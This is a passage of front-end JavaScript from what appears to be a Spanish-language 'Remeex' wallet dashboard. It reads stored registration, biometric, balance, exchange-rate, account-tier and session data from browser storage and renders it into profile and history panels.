      }
    }

    return {
      status: statusRaw || (biometric.captured ? 'captured' : 'pending'),
      statusLabel,
      captureDate,
      attempts,
      score,
      successAudioPlayed: Boolean(biometric.successAudioPlayed),
      selfieImage: biometric.selfieImage || null,
      summary: analysisSummary,
      metadata: biometric.metadata || null,
      raw: biometric
    };
  }

  function gatherProfileInfo(registration, userData, verification, banking, temp, biometric, biometricSkipped) {
    const countryCandidate =
      registration?.country ||
      registration?.countryCode ||
      userData?.country ||
      verification?.country ||
      verification?.countryCode ||
      banking?.country ||
      temp?.country ||
      temp?.countryCode ||
      loadSelectedCountry();

    const normalizeString = (value) =>
      typeof value === 'string' ? value.trim() : '';

    const fullNameCandidates = [
      registration?.fullName,
      verification?.fullName,
      userData?.fullName,
      temp?.fullName,
      banking?.fullName,
      [registration?.firstName, registration?.middleName, registration?.lastName].filter(Boolean).join(' '),
      [verification?.firstName, verification?.middleName, verification?.lastName].filter(Boolean).join(' '),
      [userData?.firstName, userData?.middleName, userData?.lastName].filter(Boolean).join(' '),
      [temp?.firstName, temp?.middleName, temp?.lastName].filter(Boolean).join(' '),
      [banking?.firstName, banking?.middleName, banking?.lastName].filter(Boolean).join(' ')
    ];

    const resolvedFullName = normalizeString(
      fullNameCandidates.find((entry) => normalizeString(entry)) || ''
    );

    const preferredName = normalizeString(
      registration?.preferredName ||
        verification?.preferredName ||
        userData?.preferredName ||
        temp?.preferredName ||
        banking?.preferredName ||
        registration?.firstName ||
        verification?.firstName ||
        userData?.firstName ||
        temp?.firstName ||
        banking?.firstName
    );

    const nickname = normalizeString(
      registration?.nickname ||
        verification?.nickname ||
        userData?.nickname ||
        temp?.nickname ||
        banking?.nickname
    );

    const email = normalizeString(
      registration?.email ||
        userData?.email ||
        verification?.email ||
        temp?.email ||
        banking?.email
    );

    const phone = normalizeString(
      registration?.phone ||
        registration?.phoneNumber ||
        verification?.phone ||
        verification?.phoneNumber ||
        userData?.phone ||
        userData?.phoneNumber ||
        temp?.phone ||
        temp?.phoneNumber ||
        banking?.phone ||
        banking?.phoneNumber
    );

    const gender = normalizeString(
      registration?.gender ||
        verification?.gender ||
        userData?.gender ||
        temp?.gender ||
        banking?.gender
    );

    const birthDate = normalizeString(
      registration?.birthDate ||
        verification?.birthDate ||
        userData?.birthDate ||
        temp?.birthDate ||
        banking?.birthDate
    );

    const documentType = normalizeString(
      registration?.documentType ||
        registration?.documentKind ||
        verification?.documentType ||
        verification?.documentKind ||
        userData?.documentType ||
        temp?.documentType ||
        banking?.documentType
    );

    const documentNumber = normalizeString(
      registration?.documentNumber ||
        registration?.documentId ||
        verification?.documentNumber ||
        verification?.documentId ||
        userData?.documentNumber ||
        userData?.documentId ||
        temp?.documentNumber ||
        temp?.documentId ||
        banking?.documentNumber ||
        banking?.documentId
    );

    const createdAt =
      registration?.completedAt ||
      registration?.createdAt ||
      userData?.completedAt ||
      userData?.createdAt ||
      verification?.completedAt ||
      verification?.createdAt ||
      temp?.completedAt ||
      banking?.completedAt ||
      banking?.createdAt ||
      null;

    const deviceId = normalizeString(safeGetFromStorage(localStorage, 'remeexDeviceId'));
    const sessionRate =
      loadJSONFromStorage(localStorage, 'remeexSessionExchangeRate') ||
      loadJSONFromStorage(sessionStorage, 'remeexSessionExchangeRate');

    const resolvedCountry = normalizeString(countryCandidate);
    const biometricInfo = resolveBiometricInfo(biometric, biometricSkipped);
    const avatarSrc = resolveAvatarSource(registration, userData, verification, banking, temp, biometricInfo);

    const fallbackForInitials = preferredName || resolvedFullName || email || 'Usuario Remeex';
    const initials = fallbackForInitials ? fallbackForInitials.charAt(0).toUpperCase() : 'U';

    return {
      avatarSrc,
      initials,
      fullName: resolvedFullName,
      preferredName,
      nickname,
      email,
      phone,
      gender,
      birthDate,
      documentType,
      documentNumber,
      country: resolvedCountry,
      createdAt,
      deviceId,
      sessionRate,
      biometric: biometricInfo,
      biometricSkipped: Boolean(biometricSkipped),
      sources: { registration, userData, verification, banking, temp, biometric }
    };
  }

  function collectRegistrationSnapshots() {
    return REGISTRATION_SNAPSHOT_DESCRIPTORS.map((descriptor) => {
      const storage = descriptor.storage === 'sessionStorage' ? sessionStorage : localStorage;
      const raw = safeGetFromStorage(storage, descriptor.key);
      const parsed = descriptor.forceString ? null : safeJSONParse(raw);
      return {
        key: descriptor.key,
        label: descriptor.label,
        storageName: descriptor.storage,
        raw,
        parsed,
        forceString: Boolean(descriptor.forceString)
      };
    });
  }

  function formatRegistrationEntries(registration) {
    if (!registration || typeof registration !== 'object') return [];
    const entries = [];
    Object.keys(registration).sort().forEach((key) => {
      const value = registration[key];
      let displayValue;
      if (value === null || value === undefined || value === '') {
        displayValue = '—';
      } else if (typeof value === 'object') {
        displayValue = JSON.stringify(value, null, 2);
      } else {
        displayValue = String(value);
      }
      entries.push({ key, value: displayValue });
    });
    return entries;
  }

  function renderRegistration(registration, hasOfficialRecord) {
    const container = document.getElementById('registration-content');
    const badge = document.getElementById('registration-updated');
    if (!container || !badge) return;

    container.innerHTML = '';

    if (!registration || Object.keys(registration).length === 0) {
      badge.textContent = 'Sin datos';
      container.innerHTML = '<div class="empty-state">Aún no se ha completado un registro en este dispositivo.</div>';
      return;
    }

    badge.textContent = hasOfficialRecord ? 'Sincronizado' : 'Datos parciales';

    const fragment = document.createDocumentFragment();
    formatRegistrationEntries(registration).forEach((entry) => {
      const item = document.createElement('div');
      item.className = 'info-item';

      const label = document.createElement('span');
      label.className = 'info-label';
      label.textContent = entry.key;

      if (entry.value.includes('\n')) {
        const pre = document.createElement('pre');
        pre.className = 'info-value info-value-block';
        pre.textContent = entry.value;
        item.appendChild(label);
        item.appendChild(pre);
      } else {
        const value = document.createElement('span');
        value.className = 'info-value';
        value.textContent = entry.value;
        item.appendChild(label);
        item.appendChild(value);
      }

      fragment.appendChild(item);
    });

    container.appendChild(fragment);
  }

  function renderBiometricVerification(biometric, biometricSkipped) {
    const card = document.getElementById('biometric-card');
    const badge = document.getElementById('biometric-status-badge');
    const photo = document.getElementById('biometric-photo');
    const photoEmpty = document.getElementById('biometric-photo-empty');
    const metaContainer = document.getElementById('biometric-meta');
    const summaryContainer = document.getElementById('biometric-summary');

    if (!card || !badge || !photo || !photoEmpty || !metaContainer || !summaryContainer) {
      return;
    }

    const info = resolveBiometricInfo(biometric, biometricSkipped);

    const setBadge = (text, status) => {
      badge.textContent = text;
      badge.dataset.status = status;
    };

    const renderEntries = (entries) => {
      metaContainer.innerHTML = '';
      if (!entries.length) {
        const empty = document.createElement('div');
        empty.className = 'empty-state';
        empty.textContent = 'No hay detalles biométricos disponibles.';
        metaContainer.appendChild(empty);
        return;
      }

      entries.forEach((entry) => {
        const item = document.createElement('div');
        item.className = 'info-item';

        const label = document.createElement('span');
        label.className = 'info-label';
        label.textContent = entry.label;

        const value = document.createElement('span');
        value.className = 'info-value';
        value.textContent = entry.value;

        item.appendChild(label);
        item.appendChild(value);
        metaContainer.appendChild(item);
      });
    };

    const updatePhoto = (source, message) => {
      if (source) {
        photo.src = source;
        photo.hidden = false;
        photoEmpty.hidden = true;
      } else {
        photo.removeAttribute('src');
        photo.hidden = true;
        photoEmpty.hidden = false;
        photoEmpty.textContent = message;
      }
    };

    const summaryParts = [];

    if (biometricSkipped) {
      setBadge('Omitida', 'error');
      updatePhoto(null, 'La biometría se omitió manualmente.');
      const skipEntries = [
        { label: 'Estado', value: 'Verificación biométrica omitida por el usuario' }
      ];
      if (info && info.raw && (info.raw.lastUpdatedAt || info.raw.captureDate)) {
        const timestamp = info.raw.lastUpdatedAt || info.raw.captureDate;
        const formatted = formatDateDetail(timestamp);
        if (formatted && formatted !== '—') {
          skipEntries.push({ label: 'Última actualización', value: formatted });
        }
      }
      renderEntries(skipEntries);
      summaryParts.push('El usuario decidió continuar sin completar la verificación biométrica facial.');
    } else if (!info) {
      setBadge('Sin datos', 'info');
      updatePhoto(null, 'No se ha registrado una captura biométrica en este dispositivo.');
      renderEntries([]);
      summaryParts.push('Completa la verificación biométrica para ver los detalles aquí.');
    } else {
      const status = (info.status || '').toLowerCase();
      const badgeStatus = status === 'success' || status === 'aprobada' || status === 'completed' ? 'success' : 'info';
      setBadge(info.statusLabel || 'Captura registrada', badgeStatus);

      const hasImage = typeof info.selfieImage === 'string' && info.selfieImage.startsWith('data:');
      updatePhoto(hasImage ? info.selfieImage : null, 'No se pudo recuperar la captura biométrica almacenada.');

      const entries = [
        { label: 'Estado', value: info.statusLabel || 'Captura registrada' },
        { label: 'Intentos realizados', value: info.attempts != null ? String(info.attempts) : '—' },
        { label: 'Fecha de captura', value: formatDateDetail(info.captureDate) },
        { label: 'Puntaje estimado', value: info.score != null ? `${info.score}%` : '—' },
        { label: 'Audio de aprobación', value: formatBoolean(info.successAudioPlayed) }
      ];

      if (info.metadata && info.metadata.finalizedAt) {
        const finalizedValue = formatDateDetail(info.metadata.finalizedAt);
        if (finalizedValue && finalizedValue !== '—') {
          entries.push({ label: 'Finalización registrada', value: finalizedValue });
        }
      }

      renderEntries(entries);

      if (info.summary) {
        if (info.summary.label) {
          summaryParts.push(info.summary.label);
        }
        if (info.summary.message) {
          summaryParts.push(info.summary.message);
        }
        if (Array.isArray(info.summary.completedStages) && info.summary.completedStages.length) {
          summaryParts.push(`Pasos completados: ${info.summary.completedStages.join(', ')}`);
        }
        if (Number.isFinite(info.summary.totalDurationMs)) {
          const seconds = info.summary.totalDurationMs / 1000;
          summaryParts.push(`Duración aproximada del escaneo: ${seconds.toFixed(1)} segundos.`);
        }
        if (Number.isFinite(info.summary.attempts)) {
          summaryParts.push(`Intento aprobado: ${info.summary.attempts}`);
        }
      }

      if (!summaryParts.length) {
        summaryParts.push('La biometría se registró correctamente y está lista para revisión manual o automática.');
      }
    }

    summaryContainer.textContent = summaryParts.join('\n\n');
  }

  function renderProfile(profile) {
    const avatarImg = document.getElementById('profile-avatar');
    const fallbackEl = document.getElementById('profile-avatar-fallback');
    const nameEl = document.getElementById('profile-name');
    const emailEl = document.getElementById('profile-email');
    const metaEl = document.getElementById('profile-meta');
    const badge = document.getElementById('profile-updated');
    if (!avatarImg || !fallbackEl || !nameEl || !emailEl || !metaEl || !badge) return;

    metaEl.innerHTML = '';

    if (!profile) {
      avatarImg.removeAttribute('src');
      avatarImg.style.display = 'none';
      fallbackEl.textContent = 'U';
      fallbackEl.setAttribute('aria-hidden', 'false');
      nameEl.textContent = 'Usuario Remeex';
      emailEl.textContent = 'Sin correo sincronizado';
      badge.textContent = 'Sin datos';
      return;
    }

    const displayName = profile.preferredName || profile.fullName || 'Usuario Remeex';
    const displayEmail = profile.email || 'Sin correo sincronizado';
    nameEl.textContent = displayName;
    emailEl.textContent = displayEmail;

    if (profile.avatarSrc) {
      avatarImg.src = profile.avatarSrc;
      avatarImg.style.display = 'block';
      fallbackEl.textContent = '';
      fallbackEl.setAttribute('aria-hidden', 'true');
    } else {
      avatarImg.removeAttribute('src');
      avatarImg.style.display = 'none';
      fallbackEl.textContent = profile.initials || 'U';
      fallbackEl.setAttribute('aria-hidden', 'false');
    }

    const documentLabel = profile.documentNumber
      ? [profile.documentType, profile.documentNumber].filter(Boolean).join(' ')
      : profile.documentType || '—';

    const metaEntries = [
      { label: 'Nombre legal', value: profile.fullName || '—' },
      { label: 'Nombre preferido', value: profile.preferredName || profile.fullName || '—' },
      { label: 'Alias o nickname', value: profile.nickname || '—' },
      { label: 'Correo principal', value: profile.email || '—' },
      { label: 'Documento de identidad', value: documentLabel || '—' },
      { label: 'País de registro', value: profile.country || '—' },
      { label: 'Teléfono de contacto', value: profile.phone || '—' },
      { label: 'Fecha de nacimiento', value: formatDateDetail(profile.birthDate) },
      { label: 'Sexo / género', value: profile.gender || '—' },
      { label: 'ID de dispositivo', value: profile.deviceId || '—' },
      { label: 'Registro completado', value: formatDateDetail(profile.createdAt) }
    ];

    if (profile.sessionRate) {
      const sessionDisplay =
        typeof profile.sessionRate === 'object'
          ? JSON.stringify(profile.sessionRate, null, 2)
          : String(profile.sessionRate);
      metaEntries.push({ label: 'Contexto de tasa de sesión', value: sessionDisplay });
    }

    if (profile.biometricSkipped) {
      metaEntries.push({ label: 'Verificación biométrica', value: 'Omitida por el usuario' });
    } else if (profile.biometric) {
      metaEntries.push({ label: 'Verificación biométrica', value: profile.biometric.statusLabel || 'Captura registrada' });
      metaEntries.push({ label: 'Intentos biométricos', value: profile.biometric.attempts != null ? String(profile.biometric.attempts) : '—' });
      metaEntries.push({ label: 'Última captura biométrica', value: formatDateDetail(profile.biometric.captureDate) });
      if (profile.biometric.score !== null && profile.biometric.score !== undefined) {
        metaEntries.push({ label: 'Puntaje biométrico', value: `${profile.biometric.score}%` });
      }
      metaEntries.push({ label: 'Audio de aprobación reproducido', value: formatBoolean(profile.biometric.successAudioPlayed) });
    }

    metaEntries.forEach((entry) => {
      if (entry.value === null || entry.value === undefined || entry.value === '') {
        entry.value = '—';
      }
      const item = document.createElement('div');
      item.className = 'meta-item';
      const label = document.createElement('span');
      label.className = 'meta-label';
      label.textContent = entry.label;
      const value = document.createElement('span');
      value.className = 'meta-value';
      value.textContent = entry.value;
      item.appendChild(label);
      item.appendChild(value);
      metaEl.appendChild(item);
    });

    const hasPrimaryData =
      Boolean(profile.avatarSrc) ||
      Boolean(profile.fullName) ||
      Boolean(profile.email) ||
      Boolean(profile.documentNumber) ||
      Boolean(profile.phone);

    badge.textContent = hasPrimaryData ? 'Sincronizado' : 'Datos parciales';
  }

  function renderRegistrationSnapshots(snapshots) {
    const container = document.getElementById('registration-snapshots');
    const badge = document.getElementById('registration-snapshots-badge');
    if (!container || !badge) return;

    container.innerHTML = '';

    if (!Array.isArray(snapshots) || snapshots.length === 0) {
      container.innerHTML = '<div class="empty-state">No se detectaron fuentes de datos de registro.</div>';
      badge.textContent = 'Sin datos';
      return;
    }

    let sourcesWithData = 0;

    snapshots.forEach((snapshot) => {
      const details = document.createElement('details');
      details.className = 'raw-entry';
      if (snapshot.key === 'visaRegistrationCompleted') {
        details.open = true;
      }

      const summary = document.createElement('summary');
      summary.textContent = snapshot.label;
      details.appendChild(summary);

      const meta = document.createElement('div');
      meta.className = 'raw-meta';
      meta.textContent = `Fuente: ${snapshot.storageName}`;
      details.appendChild(meta);

      if (snapshot.raw && snapshot.raw !== '') {
        sourcesWithData += 1;
        const pre = document.createElement('pre');
        pre.className = 'info-value info-value-block raw-json';
        if (snapshot.parsed && typeof snapshot.parsed === 'object') {
          pre.textContent = JSON.stringify(snapshot.parsed, null, 2);
        } else {
          pre.textContent = snapshot.raw;
        }
        details.appendChild(pre);
      } else {
        const empty = document.createElement('div');
        empty.className = 'raw-empty';
        empty.textContent = 'Sin datos almacenados para esta fuente.';
        details.appendChild(empty);
      }

      container.appendChild(details);
    });

    badge.textContent = `${sourcesWithData}/${snapshots.length} fuentes con datos`;
  }


  function renderRate(rateInfo) {
    const nameEl = document.getElementById('rate-name');
    const valueEl = document.getElementById('rate-value');
    const descEl = document.getElementById('rate-description');
    const eurEl = document.getElementById('rate-eur');
    const badge = document.getElementById('rate-updated');
    if (!nameEl || !valueEl || !descEl || !eurEl || !badge) return;

    if (!rateInfo.key) {
      nameEl.textContent = 'Sin seleccionar';
      valueEl.textContent = '--';
      descEl.textContent = 'Selecciona una tasa en HomeVisa para verla aquí.';
      eurEl.textContent = 'Equivalencia USD → EUR: --';
      badge.textContent = 'Pendiente';
      return;
    }

    const label = RATE_LABELS[rateInfo.key] || rateInfo.key;
    nameEl.textContent = label;
    valueEl.textContent = rateInfo.value ? `${formatNumber(rateInfo.value)} Bs/USD` : '--';
    descEl.textContent = RATE_DESCRIPTIONS[rateInfo.key] || 'Tasa personalizada seleccionada por el usuario.';
    eurEl.textContent = rateInfo.usdToEur
      ? `Equivalencia USD → EUR: ${formatNumber(1 / rateInfo.usdToEur, { maximumFractionDigits: 4 })} USD = 1 €`
      : 'Equivalencia USD → EUR: --';
    badge.textContent = 'Sincronizada';
  }

  function renderBalance(balance) {
    const container = document.getElementById('balance-summary');
    const badge = document.getElementById('balance-updated');
    if (!container || !badge) return;

    container.innerHTML = '';

    if (!balance || typeof balance !== 'object') {
      badge.textContent = 'Sin datos';
      container.innerHTML = '<div class="empty-state">No hay saldo almacenado para mostrar.</div>';
      return;
    }

    const entries = [
      { label: 'Saldo en USD', value: formatCurrency(Number(balance.usd), 'usd') },
      { label: 'Saldo en Bs', value: formatCurrency(Number(balance.bs), 'bs') },
      { label: 'Saldo en EUR', value: formatCurrency(Number(balance.eur), 'eur') }
    ];

    entries.forEach((entry) => {
      const pill = document.createElement('div');
      pill.className = 'balance-pill';
      const title = document.createElement('h3');
      title.textContent = entry.label;
      const value = document.createElement('p');
      value.textContent = entry.value;
      pill.appendChild(title);
      pill.appendChild(value);
      container.appendChild(pill);
    });

    badge.textContent = 'Sincronizado';
  }

  function renderAccountLevel(accountInfo) {
    const tierEl = document.getElementById('account-level-tier');
    const summaryEl = document.getElementById('account-level-summary');
    const balanceEl = document.getElementById('account-level-balance');
    const pointsEl = document.getElementById('account-level-points');
    const usdEl = document.getElementById('account-validation-usd');
    const bsEl = document.getElementById('account-validation-bs');
    const eurEl = document.getElementById('account-validation-eur');
    const noteEl = document.getElementById('account-validation-note');
    if (!tierEl || !summaryEl || !balanceEl || !pointsEl || !usdEl || !bsEl || !eurEl || !noteEl) {
      return;
    }

    if (!accountInfo) {
      tierEl.textContent = 'Nivel no disponible';
      summaryEl.textContent = 'Sin datos sincronizados.';
      balanceEl.textContent = '--';
      pointsEl.textContent = '--';
      usdEl.textContent = '--';
      bsEl.textContent = '--';
      eurEl.textContent = '--';
      noteEl.textContent = 'Los montos de validación aparecerán cuando se detecte tu nivel.';
      return;
    }

    tierEl.textContent = accountInfo.tier ? `Nivel ${accountInfo.tier}` : 'Nivel no disponible';

    const summaryParts = [];
    if (accountInfo.tierSource) {
      summaryParts.push(accountInfo.tierSource);
    }
    const rateParts = [];
    if (Number.isFinite(accountInfo.usdToBs)) {
      rateParts.push(`1 USD = ${formatNumber(accountInfo.usdToBs)} Bs`);
    }
    if (Number.isFinite(accountInfo.usdToEur)) {
      rateParts.push(`1 USD = ${formatNumber(accountInfo.usdToEur, { maximumFractionDigits: 4 })} €`);
    }
    if (rateParts.length) {
      summaryParts.push(rateParts.join(' · '));
    }
    summaryEl.textContent = summaryParts.length ? summaryParts.join(' · ') : 'Sin datos sincronizados.';

    const balanceParts = [];
    if (Number.isFinite(accountInfo.balanceUsd)) {
      balanceParts.push(formatCurrency(accountInfo.balanceUsd, 'usd'));
    }
    if (Number.isFinite(accountInfo.balanceBs)) {
      balanceParts.push(formatCurrency(accountInfo.balanceBs, 'bs'));
    }
    if (Number.isFinite(accountInfo.balanceEur)) {
      balanceParts.push(formatCurrency(accountInfo.balanceEur, 'eur'));
    }
    balanceEl.textContent = balanceParts.length ? balanceParts.join(' · ') : '--';

    if (accountInfo.points !== null && accountInfo.points !== undefined) {
      pointsEl.textContent = `${formatNumber(accountInfo.points, { minimumFractionDigits: 0, maximumFractionDigits: 0 })} pts`;
    } else {
      pointsEl.textContent = '—';
    }

    usdEl.textContent = Number.isFinite(accountInfo.validationUsd)
      ? formatCurrency(accountInfo.validationUsd, 'usd')
      : '--';
    bsEl.textContent = Number.isFinite(accountInfo.validationBs)
      ? formatCurrency(accountInfo.validationBs, 'bs')
      : '--';
    eurEl.textContent = Number.isFinite(accountInfo.validationEur)
      ? formatCurrency(accountInfo.validationEur, 'eur')
      : '--';

    const validation = accountInfo.validation || {};
    const noteParts = [];
    noteParts.push(`Monto base: ${formatCurrency(validation.base || VALIDATION_AMOUNTS_BY_TIER[accountInfo.tier] || 25, 'usd')}.`);
    if (validation.forced) {
      noteParts.push('Se aplica un monto de validación forzado manualmente.');
    }
    if (validation.bcvsurcharge) {
      noteParts.push('Incluye recargo de +5 USD por operar con la tasa BCV.');
    }
    if (validation.discountApplied && Number.isFinite(validation.discountValue)) {
      noteParts.push(`Descuento promocional aplicado: -${formatCurrency(validation.discountValue, 'usd')}.`);
    }
    if (Number.isFinite(validation.commission)) {
      const percentage = (validation.commission * 100).toFixed(1).replace(/\.0$/, '');
      noteParts.push(`Ajuste por comisión pendiente de ${percentage}%.`);
    }
    if (noteParts.length === 1) {
      noteParts.push('No se detectaron ajustes adicionales.');
    }
    noteEl.textContent = noteParts.join(' ');
  }

  function renderBalanceHistory(history) {
    const badge = document.getElementById('balance-history-badge');
    const statsContainer = document.getElementById('balance-history-stats');
    const tableWrapper = document.getElementById('balance-history-table-wrapper');
    const tableBody = document.getElementById('balance-history-body');
    const emptyState = document.getElementById('balance-history-empty');
    const hint = document.getElementById('balance-history-hint');
    if (!badge || !statsContainer || !tableWrapper || !tableBody || !emptyState || !hint) {
      return;
    }

    statsContainer.innerHTML = '';
    tableBody.innerHTML = '';

    if (!Array.isArray(history) || history.length === 0) {
      badge.textContent = 'Sin datos';
      emptyState.hidden = false;
      tableWrapper.hidden = true;
      hint.hidden = true;
      return;
    }

    badge.textContent = `${history.length} puntos`;
    emptyState.hidden = true;
    tableWrapper.hidden = false;
    hint.hidden = false;

    const latestEntry = history[history.length - 1];
    const latestLabel = latestEntry && Number.isFinite(latestEntry.timestampMs)
      ? formatTimestamp(latestEntry.timestampMs)
      : 'sin fecha';
    hint.textContent = `Último movimiento registrado: ${latestLabel}. Exporta los ${history.length} puntos para tus gráficos.`;

    const stats = computeHistoryStats(history);
    if (stats) {
      const statItems = [
        {
          label: 'Saldo máximo',
          value: formatCurrency(stats.max.balanceUsd, 'usd'),
          meta: stats.max.timestampMs ? formatTimestamp(stats.max.timestampMs) : '—'
        },
        {
          label: 'Saldo mínimo',
          value: formatCurrency(stats.min.balanceUsd, 'usd'),
          meta: stats.min.timestampMs ? formatTimestamp(stats.min.timestampMs) : '—'
        },
        {
          label: 'Variación total',
          value: stats.variation !== null ? formatCurrency(stats.variation, 'usd') : '--',
          meta: `${formatCurrency(stats.first.balanceUsd, 'usd')} → ${formatCurrency(stats.last.balanceUsd, 'usd')}`
        }
      ];
      if (Number.isFinite(stats.average)) {
        statItems.push({
          label: 'Saldo promedio',
          value: formatCurrency(stats.average, 'usd'),
          meta: `${stats.count} puntos analizados`
        });
      }
      statItems.forEach((item) => {
        const stat = document.createElement('div');
        stat.className = 'history-stat';
        const label = document.createElement('span');
        label.className = 'history-stat-label';
        label.textContent = item.label;
        const value = document.createElement('span');
        value.className = 'history-stat-value';
        value.textContent = item.value;
        const meta = document.createElement('span');
        meta.className = 'history-stat-meta';
        meta.textContent = item.meta;
        stat.appendChild(label);
        stat.appendChild(value);
        stat.appendChild(meta);
        statsContainer.appendChild(stat);
      });
    } else {
      const fallback = document.createElement('p');
      fallback.className = 'history-hint';
      fallback.textContent = 'Aún no hay suficientes datos para calcular máximos y mínimos.';
      statsContainer.appendChild(fallback);
    }

    history
      .slice()
      .sort((a, b) => (b.timestampMs || 0) - (a.timestampMs || 0))
      .slice(0, 25)
      .forEach((entry) => {
        const row = document.createElement('tr');

        const dateCell = document.createElement('td');
        dateCell.textContent = Number.isFinite(entry.timestampMs) ? formatTimestamp(entry.timestampMs) : '—';
        row.appendChild(dateCell);

        const balanceCell = document.createElement('td');
        const usdLine = document.createElement('div');
        usdLine.textContent = formatCurrency(entry.balanceUsd, 'usd');
        balanceCell.appendChild(usdLine);
        if (Number.isFinite(entry.balanceBs)) {
          const bsLine = document.createElement('div');
          bsLine.className = 'history-balance-secondary';
          bsLine.textContent = formatCurrency(entry.balanceBs, 'bs');
          balanceCell.appendChild(bsLine);
        }
        if (Number.isFinite(entry.balanceEur)) {
          const eurLine = document.createElement('div');
          eurLine.className = 'history-balance-secondary';
          eurLine.textContent = formatCurrency(entry.balanceEur, 'eur');
          balanceCell.appendChild(eurLine);
        }
        row.appendChild(balanceCell);

        const deltaCell = document.createElement('td');
        if (Number.isFinite(entry.deltaUsd)) {
          deltaCell.textContent = formatCurrency(entry.deltaUsd, 'usd');
          if (entry.deltaUsd > 0) {
            deltaCell.classList.add('history-delta-positive');
          } else if (entry.deltaUsd < 0) {
            deltaCell.classList.add('history-delta-negative');
          }
        } else {
          deltaCell.textContent = '—';
        }
        row.appendChild(deltaCell);

        const detailCell = document.createElement('td');
        const detailParts = [];
        if (entry.note) detailParts.push(entry.note);
        if (entry.source) detailParts.push(`Fuente: ${entry.source}`);
        detailCell.textContent = detailParts.length ? detailParts.join(' · ') : '—';
        row.appendChild(detailCell);

        if (Number.isFinite(entry.timestampMs)) {
          row.dataset.timestamp = String(entry.timestampMs);
        }
        row.dataset.balanceUsd = String(entry.balanceUsd);
        tableBody.appendChild(row);
      });
  }

  function renderSessionMonitor(monitor) {
    const indicator = document.getElementById('session-monitor-indicator');
    const statusText = document.getElementById('session-monitor-status-text');
    const badge = document.getElementById('session-monitor-badge');
    const metaContainer = document.getElementById('session-monitor-meta');
    const historyWrapper = document.getElementById('session-monitor-history-wrapper');
    const historyBody = document.getElementById('session-monitor-history');
    const emptyState = document.getElementById('session-monitor-empty');
    if (!indicator || !statusText || !badge || !metaContainer || !historyWrapper || !historyBody || !emptyState) {
      return;
    }

    metaContainer.innerHTML = '';
    historyBody.innerHTML = '';

    const hasMonitor = monitor && typeof monitor === 'object';
    const isOnline = hasMonitor && monitor.isOnline === true;

    indicator.classList.toggle('online', Boolean(isOnline));
    indicator.classList.toggle('offline', !isOnline);
    statusText.textContent = hasMonitor
      ? isOnline
        ? 'En línea'
        : 'Desconectado'
      : 'Sin datos de sesión.';

    const badgeTimestamp = hasMonitor
      ? formatDateMeta(monitor.lastSeenAt || monitor.updatedAt || monitor.lastLoginAt)
      : '';
    if (!hasMonitor) {
      badge.textContent = 'Sin datos';
    } else if (isOnline) {
      badge.textContent = badgeTimestamp ? `Activo · ${badgeTimestamp}` : 'Activo';
    } else if (badgeTimestamp) {
      badge.textContent = `Actualizado ${badgeTimestamp}`;
    } else {
      badge.textContent = 'Actualizado';
    }

    if (!hasMonitor) {
      historyWrapper.hidden = true;
      emptyState.hidden = false;
      emptyState.textContent = 'No se ha registrado historial de inicio de sesión.';
      return;
    }

    const metaEntries = [];
    const user = monitor.user || {};
    const userParts = [];
    if (user.fullName) userParts.push(user.fullName);
    if (user.email) userParts.push(user.email);
    if (userParts.length) {
      metaEntries.push({ label: 'Usuario', value: userParts.join(' · ') });
    }

    const lastLogin = formatDateDetail(monitor.lastLoginAt || monitor.lastLogin || monitor.lastLoginTime);
    if (lastLogin && lastLogin !== '—') {
      metaEntries.push({ label: 'Último inicio de sesión', value: lastLogin });
    }

    const lastSeen = formatDateDetail(monitor.lastSeenAt || monitor.lastActivityAt || monitor.updatedAt);
    if (lastSeen && lastSeen !== '—') {
      metaEntries.push({ label: 'Última actividad', value: lastSeen });
    }

    const lastLogout = formatDateDetail(monitor.lastLogoutAt || monitor.lastLogout || monitor.lastOfflineAt);
    if (lastLogout && lastLogout !== '—') {
      metaEntries.push({ label: 'Último cierre de sesión', value: lastLogout });
    }

    const sessionId = monitor.currentSessionId || monitor.sessionId || monitor.lastSessionId;
    if (sessionId) {
      metaEntries.push({ label: 'ID de sesión', value: sessionId });
    }

    const deviceInfo = monitor.deviceInfo || {};
    const deviceParts = [];
    if (deviceInfo.platform) deviceParts.push(deviceInfo.platform);
    if (deviceInfo.language) deviceParts.push(deviceInfo.language);
    if (deviceInfo.userAgent) deviceParts.push(deviceInfo.userAgent);
    if (deviceParts.length) {
      metaEntries.push({ label: 'Dispositivo', value: deviceParts.join(' · ') });
    }

    const locationInfo = monitor.location || monitor.lastLocation;
    if (locationInfo) {
      if (typeof locationInfo === 'string') {
        metaEntries.push({ label: 'Ubicación', value: locationInfo });
      } else if (typeof locationInfo === 'object') {
        const locationParts = [];
        if (locationInfo.city) locationParts.push(locationInfo.city);
        if (locationInfo.region) locationParts.push(locationInfo.region);
        if (locationInfo.country) locationParts.push(locationInfo.country);
        if (locationInfo.ip) locationParts.push(`IP ${locationInfo.ip}`);
        if (locationParts.length) {
          metaEntries.push({ label: 'Ubicación', value: locationParts.join(' · ') });
        }
      }
    }

    if (metaEntries.length === 0) {
      const emptyMeta = document.createElement('div');
      emptyMeta.className = 'info-item';
      const label = document.createElement('span');
      label.className = 'info-label';
      label.textContent = 'Detalles de sesión';
      const value = document.createElement('span');
      value.className = 'info-value';
      value.textContent = 'Sin detalles adicionales disponibles.';
      emptyMeta.appendChild(label);
      emptyMeta.appendChild(value);
      metaContainer.appendChild(emptyMeta);
    } else {
      metaEntries.forEach((entry) => {
        const item = document.createElement('div');
        item.className = 'info-item';
        const label = document.createElement('span');
        label.className = 'info-label';
        label.textContent = entry.label;
        const value = document.createElement('span');
        value.className = 'info-value';
        value.textContent = entry.value;
        item.appendChild(label);
        item.appendChild(value);
        metaContainer.appendChild(item);
      });
    }

    const history = Array.isArray(monitor.history) ? monitor.history.slice(0) : [];
    const mappedHistory = history
      .map((entry) => {
        const timestamp = entry?.at || entry?.timestamp || entry?.date || entry?.time;
        return {
          timestamp,
          type: entry?.type,
          label: SESSION_EVENT_LABELS[entry?.type] || entry?.label || entry?.type || 'Evento',
          reason: entry?.reason || entry?.message || entry?.detail || entry?.details,
          sessionId: entry?.sessionId || entry?.id || entry?.session,
          raw: entry
        };
      })
      .filter((entry) => entry.timestamp || entry.reason || entry.sessionId || entry.label);

    if (mappedHistory.length === 0) {
      historyWrapper.hidden = true;
      emptyState.hidden = false;
      emptyState.textContent = 'No se ha registrado historial de inicio de sesión.';
      return;
    }

    mappedHistory
      .sort((a, b) => {
        const aTime = Date.parse(a.timestamp) || 0;
        const bTime = Date.parse(b.timestamp) || 0;
        return bTime - aTime;
      })
      .slice(0, 15)
      .forEach((entry) => {
        const row = document.createElement('tr');

        const dateCell = document.createElement('td');
